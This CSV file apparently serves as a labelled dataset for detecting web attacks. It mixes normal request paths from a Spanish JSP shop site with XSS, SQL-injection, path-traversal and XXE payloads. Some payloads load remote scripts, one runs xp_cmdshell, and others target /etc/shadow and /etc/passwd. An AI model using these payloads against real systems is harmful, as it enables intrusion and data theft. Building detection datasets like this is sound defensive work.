payload,type
global/titulo.jsp,normal
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
miembros/salir.jsp,normal
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
miembros/salir.jsp,normal
' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,sqli
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=65&B1=A%F1adir+al+carrito,normal
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
<script>/* *\x00/javascript:alert(1)// */</script>,xss
"s?ns: select * from users where id=1 or ""?_"" or 1=1 -- 1",sqli
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",xss
/../../../../../../../../%2A,traversal
miembros/fotos.jsp,normal
"<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
publico/carrito.jsp,normal
miembros/salir.jsp,normal
imagenes/1.gif,normal
publico/miembros.jsp,normal
%20'sleep%2050',sqli
..\..\..\{FILE},traversal
miembros/editar.jsp?modo=registro&login=rintel&password=7a03i9a08RIO&nombre=Zenaida&apellidos=Baeza+Redon&email=long%40todomodelos.tg&dni=17103014F&direccion=Passatge+Permanyer%2C+53%2C+7D&ciudad=Urue%F1as&cp=34192&provincia=Salamanca&ntc=7402575875977830&B1=Registrar,normal
<img/src=@&#32;&#13; onerror = prompt('&#49;'),xss
""" or isNULL(1/0) /*",sqli
&#x0003c,xss
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
publico/registro.jsp?modo=registro&login=vajentic&password=firm%E1n&nombre=Senen&apellidos=Sampedro&email=buttons%40creacionwebs.tm&dni=62123000T&direccion=C%2F+Nuestra+Se%F1ora+De+La+Merced+S%2FN+&ciudad=Nalec&cp=05591&provincia=Guadalajara&ntc=1539157605114970&B1=Registrar,normal
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",xss
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",xss
miembros/index.jsp,normal
..%25c1%259c..%25c1%259c{FILE},traversal
miembros/salir.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
&#X03C,xss
miembros/imagenes/zarauz.jpg,normal
..///..///..///..///..///..///..///..///{FILE},traversal
imagenes/nuestratierra.jpg,normal
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/3.gif,normal
"""></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=""0%EF%BB%BF",xss
imagenes/1.gif,normal
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
"<img SRC=""javascript:document.vulnerable=true;""",xss
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},traversal
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
' or '1'='1,sqli
imagenes/logo.gif,normal
%c0%2e%c0%2e%c0%5c{FILE},traversal
publico/miembros.jsp,normal
publico/pagar.jsp?modo=insertar&precio=1914&B1=Confirmar,normal
global/estilos.css,normal
publico/productos.jsp,normal
imagenes/3.gif,normal
publico/productos.jsp,normal
"ooUEv: select * from users where id=1 <@<@ union select null,version() -- 1",sqli
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>,xss
"s?UEs: select * from users where id=1 or 1#""? union select 'a',version() -- 1",sqli
index.jsp,normal
imagenes/cmenbul.gif,normal
%c0%2e%c0%2e\{FILE},traversal
imagenes/3.gif,normal
publico/autenticar.jsp?modo=entrar&login=atl-sale&pwd=mocoso&remember=off&B1=Entrar,normal
imagenes/3.gif,normal
publico/miembros.jsp,normal
global/menum.jsp,normal
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
&#x003C;,xss
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
index.jsp,normal
or%201=1,sqli
miembros/salir.jsp,normal
foo<script>alert(document.cookie)</script>,xss
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
publico/productos.jsp,normal
publico/caracteristicas.jsp?id=1,normal
"'"">><script>alert('XSS')</script>",xss
publico/pagar.jsp?modo=insertar&precio=9136&B1=Confirmar,normal
publico/caracteristicas.jsp?id=1,normal
"'`""><\x3Cscript>javascript:alert(1)</script>",xss
"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",xss
"<script a="">'>"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<scr<script>ipt>alert('XSS');</scr</script>ipt>,xss
imagenes/3.gif,normal
publico/productos.jsp,normal
publico/productos.jsp,normal
global/creditos.jsp,normal
imagenes/logo.gif,normal
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
index.jsp,normal
"sons: select * from users where id=1 or ""%_"" or 1=1 -- 1",sqli
imagenes/3.gif,normal
imagenes/nuestratierra.jpg,normal
index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=jayavant&pwd=2s323a657a679&remember=on&B1=Entrar,normal
index.jsp,normal
) union select * from information_schema.tables;,sqli
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=26&B1=A%F1adir+al+carrito,normal
miembros/editar.jsp?modo=registro&login=derbyshi&password=filen%3Fa&nombre=Anuar&apellidos=Cruselles+Varela&email=jane%4023horas.ua&dni=95001516Q&direccion=Muelle+Evaristo+Churruca%2C+149+5%3FE&ciudad=Friera+de+Valverde&cp=50133&provincia=Salamanca&ntc=5389852449679105&B1=Registrar,normal
imagenes/1.gif,normal
global/estilos.css,normal
global/menum.jsp,normal
index.jsp,normal
publico/registro.jsp?modo=registro&login=zinkie0&password=9i3a&nombre=Esteban&apellidos=Delvalle+Llers&email=luxford_baumann%40lasiestacreativa.tel&dni=47651101T&direccion=Calle+Espiel+71+&ciudad=Rab%F3s&cp=45634&provincia=Zaragoza&ntc=8349635911694626&B1=Registrar,normal
miembros/fotos.jsp,normal
miembros/salir.jsp,normal
' or 1 --',sqli
miembros/imagenes/ogono.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/1.gif,normal
global/titulo.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
../..//../..//..///{FILE},traversal
<IMG SRC=javascript:alert('XSS')>,xss
miembros/imagenes/zarauz.jpg,normal
miembros/index.jsp,normal
"&lt;IMG SRC=\""jav&#x09;ascript&#058;alert('XSS');\""&gt;",xss
&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;,xss
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
miembros/editar.jsp?modo=registro&login=bimini&password=veg*oso&nombre=Ron&apellidos=Cortada+Mercader&email=chekhov%40biosaludsystems.gov&dni=63462420S&direccion=Plaza+De+El+Salvador+91%2C+&ciudad=Garrovillas+de+Alcon%E9tar&cp=17538&provincia=Madrid&ntc=0488545604364372&B1=Registrar,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../{FILE},traversal
%252e%252e\%252e%252e\{FILE},traversal
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
miembros/imagenes/ogono.jpg,normal
miembros/imagenes/castro.jpg,normal
publico/miembros.jsp,normal
"&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;",xss
'+sqlvuln,sqli
..\\..\\..\\..\\..\\{FILE},traversal
&#X00003c;,xss
global/titulo.jsp,normal
"s.UEf: select * from users where id=1 or 1#"". union select version(),version() -- 1",sqli
miembros/index.jsp,normal
imagenes/3.gif,normal
imagenes/logo.gif,normal
"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
global/titulo.jsp,normal
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=44&B1=A%F1adir+al+carrito,normal
"<img \x11src=x onerror=""javascript:alert(1)"">",xss
imagenes/3.gif,normal
"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
miembros/index.jsp,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito,normal
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",xss
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,traversal
"<style TYPE=""text/javascript"">document.vulnerable=true;</style>",xss
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss
imagenes/1.gif,normal
/..\{FILE},traversal
publico/miembros.jsp,normal
publico/miembros.jsp,normal
"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",xss
"\"";alert('XSS');//",xss
"<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/pagar.jsp?modo=insertar&precio=3394&B1=Pasar+por+caja,normal
miembros/imagenes/zarauz.jpg,normal
'%20or%20''=',sqli
publico/registro.jsp?modo=registro&login=ive&password=g%21arb%F3n&nombre=Virginia&apellidos=Quitral+Blasi&email=rodis-ryan%40colorprint.info&dni=05301323F&direccion=Carrer+Sant+Joan+De+Deu+186+&ciudad=Navares+de+Ayuso&cp=31253&provincia=Granada&ntc=5239525099748134&B1=Registrar,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=0&B1=A%F1adir+al+carrito,normal
imagenes/1.gif,normal
miembros/imagenes/zarauz.jpg,normal
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
miembros/salir.jsp,normal
' or 0=0 --,sqli
"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;XSS&lt;/A&gt;",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/editar.jsp?modo=registro&login=pomeroy5&password=C5fRA98&nombre=Bonifacio&apellidos=Iranzo&email=wyle%40designworld.us&dni=88356550A&direccion=C%2F+Ca+N%27alzina%2C+80%2C+6-B&ciudad=Requena+de+Campos&cp=45110&provincia=Granada&ntc=8995996565558024&B1=Registrar,normal
publico/autenticar.jsp?modo=entrar&login=kulman&pwd=53R%24retar&remember=off&B1=Entrar,normal
publico/carrito.jsp,normal
"src=""http://www.site.com/XSS.js""></script>",xss
imagenes/cmenbul.gif,normal
..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},traversal
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/fotos.jsp,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=1&B1=A%F1adir+al+carrito,normal
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/miembros.jsp,normal
global/estilos.css,normal
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",xss
"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
global/estilos.css,normal
..\..\\..\..\\\{FILE},traversal
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xee;</foo>",xss
publico/miembros.jsp,normal
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",xss
publico/miembros.jsp,normal
&lt;!&#91;endif&#93;--&gt;,xss
miembros/imagenes/zarauz.jpg,normal
imagenes/1.gif,normal
..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
..%25c0%25af{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
publico/registro.jsp?modo=registro&login=meeks&password=b1a838c2fal8&nombre=Alessandro&apellidos=And%EDa+Matamalas&email=lev%40ozlon.ke&dni=15850392B&direccion=C%2F+Euclides+51+6%3FE&ciudad=Alhama+de+Murcia&cp=47494&provincia=Guadalajara&ntc=6791383117452961&B1=Registrar,normal
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},traversal
<script\x0D>javascript:alert(1)</script>,xss
"""><img src=x onerror=javascript:alert('1')>",xss
imagenes/cmenbul.gif,normal
imagenes/cmenbul.gif,normal
imagenes/1.gif,normal
publico/miembros.jsp,normal
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,sqli
publico/pagar.jsp?modo=insertar&precio=6534&B1=Confirmar,normal
../../../../../../../../../../../../etc/shadow%00,traversal
imagenes/cmenbul.gif,normal
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS,xss
global/titulo.jsp,normal
' or 0=0 #,sqli
imagenes/nuestratierra.jpg,normal
imagenes/logo.gif,normal
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE},traversal
publico/registro.jsp?modo=registro&login=natiuk&password=atontamiento&nombre=Adalgisa&apellidos=Tasies+Cirujano&email=blomgren%40informex.jp&dni=15680534P&direccion=Dolores+Ibarruri+75+&ciudad=Fuente+el+Olmo+de+Fuentidue%F1a&cp=08698&provincia=Navarra&ntc=4073783110590723&B1=Registrar,normal
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
&lt;!--&#91;if gte IE 4&#93;&gt;,xss
imagenes/2.gif,normal
publico/miembros.jsp,normal
global/titulo.jsp,normal
publico/miembros.jsp,normal
<script>javascript:alert(1)</script>,xss
global/creditos.jsp,normal
publico/carrito.jsp,normal
imagenes/cmenbul.gif,normal
miembros/imagenes/ogono.jpg,normal
global/creditos.jsp,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=43&B1=A%F1adir+al+carrito,normal
"<;XML ID="";xss"";>;<;I>;<;B>;<;IMG SRC="";javas<;!-- -->;cript:alert(';XSS';)"";>;<;/B>;<;/I>;<;/XML>;",xss
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
x' and 1=(select count(*) from tabname); --,sqli
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",xss
imagenes/logo.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
global/titulo.jsp,normal
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,sqli
index.jsp,normal
"s)ns: select * from users where id=1 or "")$"" or 1=1 -- 1",sqli
"<img SRC=""javascript:document.vulnerable=true;""",xss
publico/miembros.jsp,normal
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",xss
../../../../../../../../{FILE},traversal
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"<img src\x12=x onerror=""javascript:alert(1)"">",xss
"<script src=""\\%(jscript)s""></script>",xss
miembros/imagenes/ogono.jpg,normal
miembros/fotos.jsp,normal
..%5c..%5c{FILE},traversal
index.jsp,normal
miembros/index.jsp,normal
"<div STYLE=""width: expression(document.vulnerable=true);"">",xss
.//..//{FILE},traversal
"s){s: select * from users where id=1 or ""){"" or 1=1 -- 1",sqli
publico/miembros.jsp,normal
"s1(s: select * from users where id=1 or ""1(""=1 or 1=1 -- 1",sqli
global/titulo.jsp,normal
publico/miembros.jsp,normal
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal
publico/miembros.jsp,normal
publico/autenticar.jsp?modo=entrar&login=pittman&pwd=a73p3i4&remember=off&B1=Entrar,normal
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;,xss
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,traversal
"'>//\\,<'>"">"">""*""",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
')%20or%20('x'='x,sqli
<~/XSS STYLE=xss:expression(alert('XSS'))>,xss
global/creditos.jsp,normal
publico/caracteristicas.jsp?id=1,normal
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",xss
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
miembros/index.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
"<;/TITLE>;<;SCRIPT>;alert(""XSS"");<;/SCRIPT>;",xss
%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",xss
' having 1=1--,sqli
global/creditos.jsp,normal
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/fotos.jsp,normal
miembros/editar.jsp?modo=registro&login=rossy&password=globula*ri%E1ceo&nombre=Amelie&apellidos=Derch+Mallol&email=dove3%40enla.nc&dni=29574909Z&direccion=Consolacion+92%2C+12%3FH&ciudad=Valverdejo&cp=26540&provincia=Granada&ntc=9079098959660122&B1=Registrar,normal
"s&oo1: select * from users where id='1' or \< =1 union select 1,@@VERSION -- 1'",sqli
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
miembros/salir.jsp,normal
http://www.<script>alert(1)</script .com,xss
..\\..\\..\\..\\..\\..\\..\\{FILE},traversal
imagenes/3.gif,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/nuestratierra.jpg,normal
<img SRC='vbscript:document.vulnerable=true;'>,xss
"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",xss
miembros/salir.jsp,normal
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
publico/carrito.jsp,normal
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",xss
"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
publico/carrito.jsp,normal
"""`'><script>\x0Cjavascript:alert(1)</script>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/2.gif,normal
imagenes/2.gif,normal
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE},traversal
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal
"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",xss
global/titulo.jsp,normal
miembros/imagenes/ogono.jpg,normal
publico/autenticar.jsp?modo=entrar&login=grandy&pwd=confIadORa&remember=on&B1=Entrar,normal
miembros/editar.jsp?modo=registro&login=herminia&password=5e938rera&nombre=Isalenia&apellidos=Ostapovich+Furnari&email=holloway_brandenburg%40bijoubijoudiferente.hu&dni=74799380E&direccion=Pl.+Poeta+Badenes%2C+48%2C+11-C&ciudad=Navas+de+San+Juan&cp=49240&provincia=Murcia&ntc=4650446572677289&B1=Registrar,normal
"<IMG SRC=x onchange=""alert(String.fromCharCode(88,83,83))"">",xss
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/pagar.jsp?modo=insertar&precio=1525&B1=Confirmar,normal
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
imagenes/2.gif,normal
publico/carrito.jsp,normal
<%<!--'%><script>alert(1);</script -->,xss
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",xss
miembros/imagenes/castro.jpg,normal
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
imagenes/cmenbul.gif,normal
"<img src=""javascript:alert('XSS')"">",xss
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///dev/random"">]><foo>&xee;</foo>",xss
global/titulo.jsp,normal
imagenes/nuestratierra.jpg,normal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=69&B1=A%F1adir+al+carrito,normal
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;,xss
a' or 'a' = 'a,sqli
imagenes/2.gif,normal
"""><img src=x onerror=javascript:alert((A))>",xss
index.jsp,normal
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE},traversal
"<div style=""binding: url(http://www.securitycompass.com/xss.js);""> [Mozilla]",xss
publico/carrito.jsp,normal
"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
